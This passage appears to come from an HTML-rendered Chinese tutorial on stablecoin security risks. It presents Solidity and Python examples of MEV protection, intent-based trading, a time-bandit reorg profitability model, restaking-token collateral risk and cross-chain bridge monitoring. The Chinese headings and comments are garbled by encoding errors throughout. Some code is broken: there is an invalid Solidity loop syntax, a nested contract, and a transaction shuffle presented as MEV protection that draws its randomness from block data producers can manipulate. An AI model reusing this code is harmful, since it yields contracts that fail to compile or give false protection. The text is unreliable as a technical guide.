# é…ç½®é“¾å’Œæ¡¥æ¥ä¿¡æ¯
chains = {
    'ethereum': {'liquidity': 1000000000},
    'polygon': {'liquidity': 200000000},
    'arbitrum': {'liquidity': 300000000},
    'optimism': {'liquidity': 150000000}
}

# æ¨¡æ‹Ÿæ”»å‡»å½±å“
attack_impact = risk_model.model_bridge_attack_impact(
    attack_bridge='ethereum_polygon_bridge',
    attack_amount=50000000,  # 5000ä¸‡ç¾å…ƒæ”»å‡»
    chain_liquidity=chains
)

print(f"å—å½±å“é“¾æ•°: {attack_impact['total_chains_affected']}")
print(f"æ€»é£é™©ä»·å€¼: ${attack_impact['total_value_at_risk']:,.0f}")
print(f"ç³»ç»Ÿæ€§é£é™©è¯„åˆ†: {attack_impact['systemic_risk_score']:.2f}")</code></pre>
            </div>
        </div>
        
        <h4>10.2.4 ä¸‰æ˜æ²»æ”»å‡»ä¸MEVé˜²æŠ¤</h4>
            
            <div class="code-block">
                <div class="code-header">
                    Solidity ä»£ç  <span class="toggle-icon">â–¼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-solidity">// MEVä¿æŠ¤æœºåˆ¶
contract MEVProtection {
    
    // æäº¤-æ­ç¤ºæ¨¡å¼é˜²æ­¢å‰ç½®äº¤æ˜“
    struct CommitData {
        bytes32 commitment;
        uint256 blockNumber;
        bool revealed;
    }
    
    mapping(address => CommitData) public commits;
    uint256 public constant REVEAL_DELAY = 2; // 2ä¸ªåŒºå—åæ‰èƒ½æ­ç¤º
    
    // ç¬¬ä¸€æ­¥ï¼šæäº¤äº¤æ˜“å“ˆå¸Œ
    function commitSwap(bytes32 commitment) external {
        commits[msg.sender] = CommitData({
            commitment: commitment,
            blockNumber: block.number,
            revealed: false
        });
    }
    
    // ç¬¬äºŒæ­¥ï¼šæ­ç¤ºå¹¶æ‰§è¡Œäº¤æ˜“
    function revealAndSwap(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 minAmountOut,
        uint256 nonce
    ) external {
        CommitData storage commit = commits[msg.sender];
        
        // éªŒè¯å»¶è¿Ÿ
        require(
            block.number >= commit.blockNumber + REVEAL_DELAY,
            "Too early to reveal"
        );
        
        // éªŒè¯æ‰¿è¯º
        bytes32 hash = keccak256(abi.encodePacked(
            tokenIn,
            tokenOut,
            amountIn,
            minAmountOut,
            nonce,
            msg.sender
        ));
        require(hash == commit.commitment, "Invalid commitment");
        require(!commit.revealed, "Already revealed");
        
        commit.revealed = true;
        
        // æ‰§è¡Œäº¤æ˜“
        _performSwap(tokenIn, tokenOut, amountIn, minAmountOut);
    }
    
    // æ‰¹é‡äº¤æ˜“æ‰§è¡Œï¼Œé™ä½MEVæœºä¼š
    struct SwapRequest {
        address user;
        address tokenIn;
        address tokenOut;
        uint256 amountIn;
        uint256 minAmountOut;
    }
    
    SwapRequest[] public pendingSwaps;
    
    function batchExecuteSwaps() external {
        require(pendingSwaps.length > 0, "No pending swaps");
        
        // éšæœºåŒ–æ‰§è¡Œé¡ºåºï¼Œé˜²æ­¢MEV
        uint256 seed = uint256(keccak256(abi.encodePacked(
            block.timestamp,
            block.difficulty,
            pendingSwaps.length
        )));
        
        // Fisher-Yatesæ´—ç‰Œç®—æ³•
        for (uint256 i = pendingSwaps.length - 1; i > 0; i--) {
            uint256 j = seed % (i + 1);
            SwapRequest memory temp = pendingSwaps[i];
            pendingSwaps[i] = pendingSwaps[j];
            pendingSwaps[j] = temp;
            seed = uint256(keccak256(abi.encodePacked(seed)));
        }
        
        // æ‰§è¡Œæ‰€æœ‰äº¤æ˜“
        for (uint256 i = 0; i < pendingSwaps.length; i++) {
            SwapRequest memory swap = pendingSwaps[i];
            _performSwapForUser(
                swap.user,
                swap.tokenIn,
                swap.tokenOut,
                swap.amountIn,
                swap.minAmountOut
            );
        }
        
        delete pendingSwaps;
    }
}

// MEVåˆ©æ¶¦åˆ†é…æœºåˆ¶
contract MEVRedistribution {
    uint256 public mevRewards;
    mapping(address => uint256) public userShares;
    uint256 public totalShares;
    
    // å°†MEVåˆ©æ¶¦è¿”è¿˜ç»™ç”¨æˆ·
    function distributeMEVRewards() external {
        uint256 rewards = mevRewards;
        mevRewards = 0;
        
        // æŒ‰æ¯”ä¾‹åˆ†é…ç»™æ‰€æœ‰å‚ä¸è€…
        for (address user in getActiveUsers()) {
            uint256 share = userShares[user];
            if (share > 0) {
                uint256 reward = (rewards * share) / totalShares;
                payable(user).transfer(reward);
            }
        }
    }
}</code></pre>
                </div>
            </div>
            
            <h5>Intent-Based Architectureï¼šä»æ ¹æœ¬ä¸Šæ¶ˆé™¤MEV</h5>
            <p>2024å¹´çš„å‰æ²¿æ–¹å‘æ˜¯æ„å›¾æ¶æ„ï¼ˆIntent-based Architectureï¼‰ï¼Œå¦‚CowSwapã€SUAVEç­‰ï¼Œé€šè¿‡å°†ç”¨æˆ·æ„å›¾ä¸æ‰§è¡Œåˆ†ç¦»æ¥æ¶ˆé™¤MEVï¼š</p>
            
            <div class="code-block">
                <div class="code-header">
                    Solidity ä»£ç  <span class="toggle-icon">â–¼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-solidity">// æ„å›¾åŸºç¡€çš„äº¤æ˜“ç³»ç»Ÿ
contract IntentBasedTrading {
    
    struct Intent {
        address user;
        address tokenIn;
        address tokenOut;
        uint256 amountIn;
        uint256 minAmountOut;
        uint256 deadline;
        bytes32 conditionHash;  // æ‰§è¡Œæ¡ä»¶çš„å“ˆå¸Œ
        bool executed;
    }
    
    struct Solution {
        bytes32 intentId;
        address solver;
        uint256 amountOut;
        bytes executionPath;  // ç¼–ç çš„æ‰§è¡Œè·¯å¾„
        uint256 solverReward;
    }
    
    mapping(bytes32 => Intent) public intents;
    mapping(bytes32 => Solution[]) public solutions;
    mapping(address => bool) public approvedSolvers;
    
    // ç”¨æˆ·æäº¤æ„å›¾
    function submitIntent(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 minAmountOut,
        uint256 deadline,
        bytes calldata conditions
    ) external returns (bytes32 intentId) {
        intentId = keccak256(abi.encodePacked(
            msg.sender,
            tokenIn,
            tokenOut,
            amountIn,
            block.timestamp
        ));
        
        intents[intentId] = Intent({
            user: msg.sender,
            tokenIn: tokenIn,
            tokenOut: tokenOut,
            amountIn: amountIn,
            minAmountOut: minAmountOut,
            deadline: deadline,
            conditionHash: keccak256(conditions),
            executed: false
        });
        
        // è½¬å…¥ä»£å¸åˆ°åˆçº¦
        IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);
        
        emit IntentSubmitted(intentId, msg.sender, minAmountOut);
    }
    
    // Solverç«äº‰æ€§æäº¤è§£å†³æ–¹æ¡ˆ
    function proposeSolution(
        bytes32 intentId,
        uint256 amountOut,
        bytes calldata executionPath,
        uint256 requiredReward
    ) external onlyApprovedSolver {
        Intent storage intent = intents[intentId];
        require(!intent.executed, "Intent already executed");
        require(block.timestamp < intent.deadline, "Intent expired");
        require(amountOut >= intent.minAmountOut, "Output too low");
        
        // éªŒè¯è§£å†³æ–¹æ¡ˆçš„æœ‰æ•ˆæ€§
        require(
            validateSolution(intent, executionPath, amountOut),
            "Invalid solution"
        );
        
        solutions[intentId].push(Solution({
            intentId: intentId,
            solver: msg.sender,
            amountOut: amountOut,
            executionPath: executionPath,
            solverReward: requiredReward
        }));
        
        emit SolutionProposed(intentId, msg.sender, amountOut);
    }
    
    // æ‰¹é‡æ‰§è¡Œæœ€ä¼˜è§£å†³æ–¹æ¡ˆ
    function executeBatch(
        bytes32[] calldata intentIds
    ) external {
        for (uint256 i = 0; i < intentIds.length; i++) {
            bytes32 intentId = intentIds[i];
            Intent storage intent = intents[intentId];
            
            if (intent.executed || block.timestamp >= intent.deadline) {
                continue;
            }
            
            // é€‰æ‹©æœ€ä¼˜è§£å†³æ–¹æ¡ˆ
            Solution memory bestSolution = selectBestSolution(intentId);
            
            if (bestSolution.solver != address(0)) {
                // æ‰§è¡Œè§£å†³æ–¹æ¡ˆ
                executeSolution(intent, bestSolution);
                intent.executed = true;
                
                emit IntentExecuted(
                    intentId,
                    bestSolution.solver,
                    bestSolution.amountOut
                );
            }
        }
    }
    
    function selectBestSolution(
        bytes32 intentId
    ) internal view returns (Solution memory best) {
        Solution[] storage solutionList = solutions[intentId];
        uint256 bestScore = 0;
        
        for (uint256 i = 0; i < solutionList.length; i++) {
            Solution storage solution = solutionList[i];
            
            // è¯„åˆ†å…¬å¼ï¼šè¾“å‡ºæ•°é‡ - Solverå¥–åŠ±
            uint256 score = solution.amountOut - solution.solverReward;
            
            if (score > bestScore) {
                bestScore = score;
                best = solution;
            }
        }
    }
    
    // SUAVEé£æ ¼çš„éšç§æ„å›¾
    contract PrivateIntentPool {
        using SUAVE for bytes;
        
        // åŠ å¯†çš„æ„å›¾å­˜å‚¨
        mapping(bytes32 => bytes) private encryptedIntents;
        
        function submitPrivateIntent(
            bytes calldata encryptedIntent,
            bytes32 commitment
        ) external {
            // éªŒè¯æ‰¿è¯º
            require(
                keccak256(encryptedIntent) == commitment,
                "Invalid commitment"
            );
            
            // å­˜å‚¨åŠ å¯†æ„å›¾
            bytes32 intentId = keccak256(abi.encodePacked(
                msg.sender,
                block.timestamp
            ));
            encryptedIntents[intentId] = encryptedIntent;
            
            // é€šçŸ¥å¯ä¿¡æ‰§è¡Œç¯å¢ƒ(TEE)
            emit PrivateIntentSubmitted(intentId, msg.sender);
        }
        
        // åªæœ‰TEEå¯ä»¥è§£å¯†å’Œæ‰§è¡Œ
        function executePrivateIntent(
            bytes32 intentId,
            bytes calldata proof
        ) external onlyTEE {
            bytes memory encryptedIntent = encryptedIntents[intentId];
            
            // åœ¨TEEä¸­è§£å¯†å’Œæ‰§è¡Œ
            // ...
        }
    }
}</code></pre>
                </div>
            </div>
        </div>
        
        <h4>10.2.4 æ—¶é—´å¼ºç›—æ”»å‡»ï¼ˆTime-bandit MEVï¼‰</h4>
        
        <div class="warning-box">
            <p><strong>æ—¶é—´å¼ºç›—æ”»å‡»</strong>ï¼šåŒºå—ç”Ÿäº§è€…ä¸ºäº†æ•è·è¿‡å»çš„MEVè€Œé‡ç»„é“¾çš„æ”»å‡»æ–¹å¼ã€‚è¿™ç§æ”»å‡»å±•ç¤ºäº†å…±è¯†å±‚å®‰å…¨ä¸åº”ç”¨å±‚å®‰å…¨çš„æ·±åº¦äº¤äº’ã€‚</p>
        </div>
        
        <h5>æ”»å‡»æœºåˆ¶åˆ†æ</h5>
        <div class="code-block">
            <div class="code-header">
                Python ä»£ç  <span class="toggle-icon">â–¼</span>
            </div>
            <div class="code-content" style="display: none;">
                <pre><code class="language-python">class TimeBanditAttack:
    """æ—¶é—´å¼ºç›—æ”»å‡»æ¨¡å‹"""
    
    def __init__(self, chain_config: dict):
        self.block_reward = chain_config['block_reward']
        self.reorg_cost = chain_config['reorg_cost']
        self.finality_depth = chain_config['finality_depth']
        
    def calculate_profitability(self, 
                              historical_mev: list,
                              reorg_depth: int) -> dict:
        """è®¡ç®—é‡ç»„æ”»å‡»çš„æ”¶ç›Šæ€§"""
        
        # è®¡ç®—å¯æ•è·çš„MEVä»·å€¼
        capturable_mev = sum(historical_mev[-reorg_depth:])
        
        # è®¡ç®—é‡ç»„æˆæœ¬
        reorg_costs = {
            'lost_rewards': self.block_reward * reorg_depth,
            'reputation_cost': self.estimate_reputation_damage(reorg_depth),
            'opportunity_cost': self.calculate_opportunity_cost(reorg_depth)
        }
        
        total_cost = sum(reorg_costs.values())
        
        # è€ƒè™‘æˆåŠŸæ¦‚ç‡
        success_probability = self.calculate_success_probability(reorg_depth)
        
        expected_profit = (capturable_mev * success_probability) - total_cost
        
        return {
            'capturable_mev': capturable_mev,
            'total_cost': total_cost,
            'success_probability': success_probability,
            'expected_profit': expected_profit,
            'attack_feasible': expected_profit > 0
        }
    
    def calculate_success_probability(self, reorg_depth: int) -> float:
        """è®¡ç®—é‡ç»„æˆåŠŸæ¦‚ç‡"""
        # éšç€æ·±åº¦å¢åŠ ï¼ŒæˆåŠŸç‡æŒ‡æ•°ä¸‹é™
        if reorg_depth >= self.finality_depth:
            return 0.0
        
        # åŸºäºç½‘ç»œå‚æ•°çš„æ¦‚ç‡æ¨¡å‹
        base_probability = 0.9
        decay_factor = 0.7
        
        return base_probability * (decay_factor ** reorg_depth)
    
    def analyze_stablecoin_vulnerability(self, 
                                       stablecoin_protocol: dict) -> dict:
        """åˆ†æç¨³å®šå¸å¯¹æ—¶é—´å¼ºç›—æ”»å‡»çš„è„†å¼±æ€§"""
        
        vulnerabilities = []
        
        # æ£€æŸ¥æ¸…ç®—æœºåˆ¶
        if stablecoin_protocol['liquidation_delay'] < self.finality_depth:
            vulnerabilities.append({
                'type': 'liquidation_reversal',
                'severity': 'high',
                'description': 'æ¸…ç®—å¯èƒ½è¢«å›æ»šï¼Œå¯¼è‡´ä¸è‰¯å€ºåŠ¡'
            })
        
        # æ£€æŸ¥é¢„è¨€æœºæ›´æ–°
        if stablecoin_protocol['oracle_finality'] < self.finality_depth:
            vulnerabilities.append({
                'type': 'oracle_manipulation',
                'severity': 'critical',
                'description': 'é¢„è¨€æœºä»·æ ¼æ›´æ–°å¯èƒ½è¢«å›æ»š'
            })
        
        # æ£€æŸ¥æ²»ç†å†³ç­–
        if stablecoin_protocol['governance_delay'] < self.finality_depth * 2:
            vulnerabilities.append({
                'type': 'governance_attack',
                'severity': 'medium',
                'description': 'æ²»ç†å†³ç­–å¯èƒ½è¢«æ“çºµ'
            })
        
        return {
            'vulnerabilities': vulnerabilities,
            'overall_risk': self.calculate_overall_risk(vulnerabilities)
        }
</code></pre>
            </div>
        </div>
        
        <h4>10.2.5 å†è´¨æŠ¼é£é™©ï¼ˆRestaking Risksï¼‰</h4>
        
        <div class="info-box">
            <p><strong>ğŸ”¥ 2024å¹´æœ€é‡è¦çš„æ–°å…´é£é™©</strong>ï¼šéšç€EigenLayerç­‰å†è´¨æŠ¼åè®®çš„å…´èµ·ï¼Œç¨³å®šå¸å¼€å§‹æ¥å—æµåŠ¨æ€§å†è´¨æŠ¼ä»£å¸ï¼ˆLRTsï¼‰ä½œä¸ºæŠµæŠ¼å“ï¼Œå¼•å…¥äº†å‰æ‰€æœªæœ‰çš„å¤šå±‚é£é™©å åŠ ã€‚</p>
        </div>
        
        <h5>LRTé£é™©å±‚çº§åˆ†æ</h5>
        <div class="code-block">
            <div class="code-header">
                Solidity ä»£ç  <span class="toggle-icon">â–¼</span>
            </div>
            <div class="code-content" style="display: none;">
                <pre><code class="language-solidity">// LRTä½œä¸ºæŠµæŠ¼å“çš„é£é™©ç®¡ç†åˆçº¦
contract LRTCollateralManager {
    
    struct LRTRiskProfile {
        uint256 baseAssetRisk;      // åº•å±‚ETHè´¨æŠ¼é£é™©
        uint256 avssRisk;           // AVSç½šæ²¡é£é™©
        uint256 protocolRisk;       // LRTåè®®é£é™©
        uint256 liquidityRisk;      // æµåŠ¨æ€§é£é™©
        uint256 correlationRisk;    // ç›¸å…³æ€§é£é™©
    }
    
    struct AVSExposure {
        address avsAddress;
        uint256 stakedAmount;
        uint256 slashingRisk;
        uint256 rewardVolatility;
        bool hasHistoricalSlashing;
    }
    
    mapping(address => LRTRiskProfile) public lrtRiskProfiles;
    mapping(address => AVSExposure[]) public lrtAVSExposures;
    
    // åŠ¨æ€æŠµæŠ¼ç‡è®¡ç®—
    function calculateDynamicCollateralRatio(
        address lrtToken,
        uint256 baseRatio
    ) public view returns (uint256) {
        LRTRiskProfile memory risk = lrtRiskProfiles[lrtToken];
        
        // åŸºç¡€æŠµæŠ¼ç‡æ ¹æ®é£é™©è°ƒæ•´
        uint256 riskMultiplier = calculateRiskMultiplier(risk);
        
        // è€ƒè™‘AVSæš´éœ²
        uint256 avsRiskPremium = calculateAVSRiskPremium(lrtToken);
        
        // æœ€ç»ˆæŠµæŠ¼ç‡ = åŸºç¡€ç‡ * é£é™©ä¹˜æ•° + AVSé£é™©æº¢ä»·
        return (baseRatio * riskMultiplier / 100) + avsRiskPremium;
    }
    
    function calculateRiskMultiplier(
        LRTRiskProfile memory risk
    ) internal pure returns (uint256) {
        // å¤åˆé£é™©è®¡ç®—
        uint256 totalRisk = risk.baseAssetRisk +
                           risk.avssRisk +
                           risk.protocolRisk +
                           risk.liquidityRisk;
        
        // è€ƒè™‘é£é™©ç›¸å…³æ€§ï¼ˆéçº¿æ€§å åŠ ï¼‰
        uint256 correlationAdjustment = (totalRisk * risk.correlationRisk) / 10000;
        
        // é£é™©ä¹˜æ•°ï¼š100 = æ— é¢å¤–é£é™©ï¼Œ200 = åŒå€æŠµæŠ¼è¦æ±‚
        return 100 + totalRisk + correlationAdjustment;
    }
    
    // ç›‘æ§AVSç½šæ²¡äº‹ä»¶
    function handleAVSSlashing(
        address lrtToken,
        address avsAddress,
        uint256 slashingAmount
    ) external onlyOracle {
        // æ›´æ–°é£é™©è¯„åˆ†
        lrtRiskProfiles[lrtToken].avssRisk += calculateSlashingImpact(
            slashingAmount,
            getTotalLRTValue(lrtToken)
        );
        
        // è§¦å‘ç´§æ€¥æŠµæŠ¼ç‡è°ƒæ•´
        if (lrtRiskProfiles[lrtToken].avssRisk > CRITICAL_RISK_THRESHOLD) {
            triggerEmergencyDeleveraging(lrtToken);
        }
        
        emit AVSSlashingDetected(lrtToken, avsAddress, slashingAmount);
    }
}

// é£é™©ä¼ æŸ“æ¨¡å‹
contract RiskContagionModel {
    
    struct SystemicRiskScenario {
        string description;
        uint256 probability;
        uint256 impactSeverity;
        address[] affectedProtocols;
    }
    
    // æ¨¡æ‹ŸLRTç›¸å…³çš„ç³»ç»Ÿæ€§é£é™©
    function simulateContagion(
        address triggerProtocol,
        uint256 initialShock
    ) external view returns (SystemicRiskScenario memory) {
        // æ„å»ºåè®®ä¾èµ–å›¾
        address[] memory dependentProtocols = getDependentProtocols(triggerProtocol);
        
        // è®¡ç®—ä¼ æŸ“è·¯å¾„
        uint256[] memory contagionImpacts = new uint256[](dependentProtocols.length);
        
        for (uint i = 0; i < dependentProtocols.length; i++) {
            // è®¡ç®—æ¯ä¸ªåè®®å—åˆ°çš„å†²å‡»
            contagionImpacts[i] = calculateContagionImpact(
                initialShock,
                getExposure(dependentProtocols[i], triggerProtocol),
                getProtocolResilience(dependentProtocols[i])
            );
        }
        
        // è¯„ä¼°ç³»ç»Ÿæ€§é£é™©
        return SystemicRiskScenario({
            description: "LRT mass slashing cascade",
            probability: calculateCascadeProbability(contagionImpacts),
            impactSeverity: sum(contagionImpacts),
            affectedProtocols: dependentProtocols
        });
    }
}</code></pre>
            </div>
        </div>
        
        <h5>LRTé£é™©ç¼“é‡Šç­–ç•¥</h5>
        <div class="code-block">
            <div class="code-header">
                Python ä»£ç  <span class="toggle-icon">â–¼</span>
            </div>
            <div class="code-content" style="display: none;">
                <pre><code class="language-python">class LRTRiskMitigation:
    """LRTé£é™©ç¼“é‡Šç­–ç•¥å®ç°"""
    
    def __init__(self):
        self.risk_params = {
            'max_lrt_concentration': 0.3,  # æœ€å¤§LRTé›†ä¸­åº¦
            'avs_diversity_requirement': 5,  # æœ€å°AVSåˆ†æ•£åº¦
            'correlation_threshold': 0.7,   # ç›¸å…³æ€§é˜ˆå€¼
            'buffer_requirement': 0.2       # é¢å¤–ç¼“å†²è¦æ±‚
        }
    
    def design_defensive_strategy(self, 
                                stablecoin_protocol: dict) -> dict:
        """è®¾è®¡é’ˆå¯¹LRTé£é™©çš„é˜²å¾¡ç­–ç•¥"""
        
        strategies = {
            'collateral_limits': self.set_lrt_exposure_limits(),
            'dynamic_parameters': self.create_dynamic_risk_parameters(),
            'monitoring_system': self.design_monitoring_framework(),
            'emergency_procedures': self.define_emergency_responses()
        }
        
        return strategies
    
    def set_lrt_exposure_limits(self) -> dict:
        """è®¾ç½®LRTæš´éœ²é™åˆ¶"""
        return {
            'single_lrt_cap': '10% of total collateral',
            'total_lrt_cap': '30% of total collateral',
            'per_avs_exposure': '5% of total collateral',
            'concentration_penalties': {
                '0-10%': 0,
                '10-20%': 5,  # 5%é¢å¤–æŠµæŠ¼è¦æ±‚
                '20-30%': 15  # 15%é¢å¤–æŠµæŠ¼è¦æ±‚
            }
        }
    
    def create_dynamic_risk_parameters(self) -> dict:
        """åˆ›å»ºåŠ¨æ€é£é™©å‚æ•°ç³»ç»Ÿ"""
        return {
            'oracle_requirements': {
                'lrt_price_sources': 5,  # éœ€è¦5ä¸ªä»·æ ¼æº
                'avs_performance_feed': True,
                'slashing_event_feed': True
            },
            'liquidation_adjustments': {
                'lrt_liquidation_bonus': '15%',  # é«˜äºæ™®é€šæŠµæŠ¼å“
                'partial_liquidation_enabled': True,
                'grace_period': '2 hours'
            },
            'interest_rate_model': {
                'base_rate_adjustment': '+2%',
                'utilization_curve_steepness': 1.5
            }
        }
    
    def design_monitoring_framework(self) -> dict:
        """è®¾è®¡ç›‘æ§æ¡†æ¶"""
        return {
            'real_time_monitors': [
                'avs_performance_tracker',
                'slashing_event_detector',
                'liquidity_depth_monitor',
                'correlation_analyzer'
            ],
            'alert_thresholds': {
                'avs_underperformance': -10,
                'liquidity_drop': -30,
                'correlation_spike': 0.8
            },
            'automated_responses': {
                'increase_collateral_ratio': 'correlation > 0.7',
                'pause_lrt_deposits': 'slashing_detected',
                'trigger_deleveraging': 'liquidity < threshold'
            }
        }
    
    def analyze_systemic_risk(self, market_state: dict) -> dict:
        """åˆ†æLRTå¼•å…¥çš„ç³»ç»Ÿæ€§é£é™©"""
        
        # æ„å»ºé£é™©ä¼ æŸ“çŸ©é˜µ
        contagion_matrix = self.build_contagion_matrix(
            market_state['protocols'],
            market_state['lrt_exposures']
        )
        
        # è¿è¡Œå‹åŠ›æµ‹è¯•
        stress_scenarios = [
            {'name': 'Major AVS Slashing', 'shock': -30},
            {'name': 'EigenLayer Exploit', 'shock': -50},
            {'name': 'Correlated AVS Failure', 'shock': -40}
        ]
        
        results = {}
        for scenario in stress_scenarios:
            impact = self.simulate_shock_propagation(
                contagion_matrix,
                scenario['shock']
            )
            results[scenario['name']] = {
                'direct_impact': impact['direct'],
                'contagion_effect': impact['contagion'],
                'total_system_loss': impact['total'],
                'protocols_at_risk': impact['at_risk_count']
            }
        
        return results
</code></pre>
            </div>
        </div>
        
        <div class="warning-box">
            <h5>âš ï¸ LRTé›†æˆçš„å…³é”®é£é™©ç‚¹</h5>
            <ul>
                <li><strong>å¤šå±‚ç½šæ²¡é£é™©ï¼š</strong>åº•å±‚ETH + å¤šä¸ªAVSçš„å¤åˆç½šæ²¡å¯èƒ½</li>
                <li><strong>æµåŠ¨æ€§å¹»è§‰ï¼š</strong>LRTåœ¨å‹åŠ›æƒ…å†µä¸‹å¯èƒ½å¤±å»æµåŠ¨æ€§</li>
                <li><strong>ç›¸å…³æ€§é£é™©ï¼š</strong>å¤šä¸ªLRTå¯èƒ½å› å…±åŒAVSæš´éœ²è€ŒåŒæ—¶è´¬å€¼</li>
                <li><strong>æ²»ç†æ”»å‡»é¢ï¼š</strong>é€šè¿‡æ“çºµAVSæ²»ç†é—´æ¥æ”»å‡»ç¨³å®šå¸</li>
                <li><strong>çº§è”æ¸…ç®—ï¼š</strong>ä¸€ä¸ªAVSå¤±è´¥å¯èƒ½è§¦å‘è¿é”æ¸…ç®—</li>
            </ul>
        </div>
        
        <h4>10.2.6 è·¨é“¾æ¡¥é£é™©ï¼ˆCross-chain Bridge Risksï¼‰</h4>
        
        <div class="warning-box">
            <p><strong>ğŸŒ‰ è·¨é“¾æ¡¥çš„åŒé‡é£é™©</strong>ï¼šç¨³å®šå¸çš„åŸç”Ÿç‰ˆæœ¬å’Œæ¡¥æ¥ç‰ˆæœ¬åœ¨ä¸åŒé“¾ä¸Šå…±å­˜ï¼Œæ”»å‡»è€…å¯èƒ½æ”»å‡»æœ€è–„å¼±çš„è·¨é“¾æ¡¥ï¼Œå‡­ç©ºé“¸é€ "åŒ…è£…"ç¨³å®šå¸ï¼Œç¨€é‡Šå…¶ä»·å€¼æˆ–å¯¼è‡´ç‰¹å®šé“¾ä¸Šçš„ç‰ˆæœ¬è„±é”šã€‚</p>
        </div>
        
        <h5>è·¨é“¾æ¡¥æ”»å‡»å‘é‡åˆ†æ</h5>
        <div class="code-block">
            <div class="code-header">
                Solidity ä»£ç  <span class="toggle-icon">â–¼</span>
            </div>
            <div class="code-content" style="display: none;">
                <pre><code class="language-solidity">// è·¨é“¾æ¡¥é£é™©ç®¡ç†ç³»ç»Ÿ
contract CrossChainRiskManager {
    
    struct BridgedAssetInfo {
        address nativeChain;
        address bridgeContract;
        uint256 totalMinted;
        uint256 collateralLocked;
        uint256 lastAuditTime;
        bool isVerified;
    }
    
    struct BridgeRiskProfile {
        uint256 securityScore;      // å®‰å…¨è¯„åˆ† (0-100)
        uint256 decentralization;   // å»ä¸­å¿ƒåŒ–ç¨‹åº¦
        uint256 auditFrequency;     // å®¡è®¡é¢‘ç‡
        uint256 historicalIncidents; // å†å²äº‹ä»¶æ•°
        uint256 tvlRatio;           // TVLå æ¯”
    }
    
    mapping(address => BridgedAssetInfo) public bridgedAssets;
    mapping(address => BridgeRiskProfile) public bridgeRisks;
    
    // éªŒè¯è·¨é“¾é“¸é€ è¯·æ±‚
    function validateCrosschainMint(
        address bridgedToken,
        uint256 amount,
        bytes calldata proof
    ) external returns (bool) {
        BridgedAssetInfo memory info = bridgedAssets[bridgedToken];
        
        // 1. éªŒè¯è¯æ˜æœ‰æ•ˆæ€§
        require(verifyBridgeProof(info.bridgeContract, proof), "Invalid proof");
        
        // 2. æ£€æŸ¥é“¸é€ ä¸Šé™
        require(
            info.totalMinted + amount <= info.collateralLocked,
            "Exceeds collateral"
        );
        
        // 3. é£é™©è¯„åˆ†æ£€æŸ¥
        BridgeRiskProfile memory risk = bridgeRisks[info.bridgeContract];
        if (risk.securityScore < 80) {
            // é«˜é£é™©æ¡¥éœ€è¦é¢å¤–éªŒè¯
            require(performEnhancedValidation(bridgedToken, amount), 
                    "Failed enhanced validation");
        }
        
        // 4. é€Ÿç‡é™åˆ¶
        require(checkRateLimit(bridgedToken, amount), "Rate limit exceeded");
        
        return true;
    }
    
    // ç›‘æ§æ¡¥æ¥èµ„äº§å¥åº·åº¦
    function monitorBridgeHealth(address bridgedToken) 
        external 
        view 
        returns (uint256 healthScore) 
    {
        BridgedAssetInfo memory info = bridgedAssets[bridgedToken];
        BridgeRiskProfile memory risk = bridgeRisks[info.bridgeContract];
        
        // è®¡ç®—å¥åº·åº¦è¯„åˆ†
        uint256 collateralRatio = (info.collateralLocked * 100) / info.totalMinted;
        uint256 timeSinceAudit = block.timestamp - info.lastAuditTime;
        
        // åŸºç¡€åˆ†æ•°
        healthScore = risk.securityScore;
        
        // æŠµæŠ¼ç‡è°ƒæ•´
        if (collateralRatio < 100) {
            healthScore = (healthScore * collateralRatio) / 100;
        }
        
        // å®¡è®¡æ—¶æ•ˆæ€§è°ƒæ•´
        if (timeSinceAudit > 30 days) {
            uint256 penalty = (timeSinceAudit - 30 days) / 1 days;
            healthScore = healthScore > penalty ? healthScore - penalty : 0;
        }
        
        // å†å²äº‹ä»¶æƒ©ç½š
        healthScore = healthScore > (risk.historicalIncidents * 10) ? 
                     healthScore - (risk.historicalIncidents * 10) : 0;
                     
        return healthScore;
    }
}

// å¤šé“¾ç¨³å®šå¸ç»Ÿä¸€ç®¡ç†
contract MultiChainStablecoinOrchestrator {
    
    struct ChainDeployment {
        uint256 chainId;
        address tokenAddress;
        address bridgeAddress;
        uint256 circulatingSupply;
        uint256 reserveBacking;
        bool isPaused;
    }
    
    struct RebalanceAction {
        uint256 fromChain;
        uint256 toChain;
        uint256 amount;
        string reason;
    }
    
    mapping(uint256 => ChainDeployment) public deployments;
    mapping(bytes32 => bool) public processedMessages;
    
    // è·¨é“¾ä¾›åº”é‡åŒæ­¥
    function syncCrossChainSupply(
        uint256[] calldata chainIds,
        uint256[] calldata supplies,
        bytes[] calldata proofs
    ) external onlyOracle {
        require(chainIds.length == supplies.length, "Length mismatch");
        
        uint256 totalSupply = 0;
        uint256 totalReserves = 0;
        
        for (uint i = 0; i < chainIds.length; i++) {
            // éªŒè¯æ¯æ¡é“¾çš„æ•°æ®
            require(verifyChainData(chainIds[i], supplies[i], proofs[i]), 
                    "Invalid chain data");
            
            deployments[chainIds[i]].circulatingSupply = supplies[i];
            totalSupply += supplies[i];
            totalReserves += deployments[chainIds[i]].reserveBacking;
        }
        
        // æ£€æŸ¥å…¨å±€æŠµæŠ¼ç‡
        uint256 globalCollateralRatio = (totalReserves * 100) / totalSupply;
        
        if (globalCollateralRatio < MINIMUM_GLOBAL_RATIO) {
            triggerEmergencyMode();
        }
    }
    
    // æ£€æµ‹å¹¶å“åº”é“¾é—´ä¸å¹³è¡¡
    function detectAndRebalance() external returns (RebalanceAction[] memory) {
        uint256[] memory chainIds = getActiveChains();
        RebalanceAction[] memory actions = new RebalanceAction[](chainIds.length);
        uint256 actionCount = 0;
        
        // è®¡ç®—æ¯æ¡é“¾çš„åå·®
        for (uint i = 0; i < chainIds.length; i++) {
            ChainDeployment memory chain = deployments[chainIds[i]];
            
            // æ£€æŸ¥é“¾ä¸Šä¾›åº”é‡ä¸å‚¨å¤‡çš„æ¯”ä¾‹
            uint256 localRatio = (chain.reserveBacking * 100) / 
                                chain.circulatingSupply;
            
            if (localRatio < TARGET_RATIO - TOLERANCE) {
                // éœ€è¦å¢åŠ å‚¨å¤‡æˆ–å‡å°‘ä¾›åº”
                actions[actionCount++] = RebalanceAction({
                    fromChain: findSurplusChain(),
                    toChain: chainIds[i],
                    amount: calculateRebalanceAmount(chainIds[i]),
                    reason: "Under-collateralized"
                });
            }
        }
        
        // æ‰§è¡Œå†å¹³è¡¡
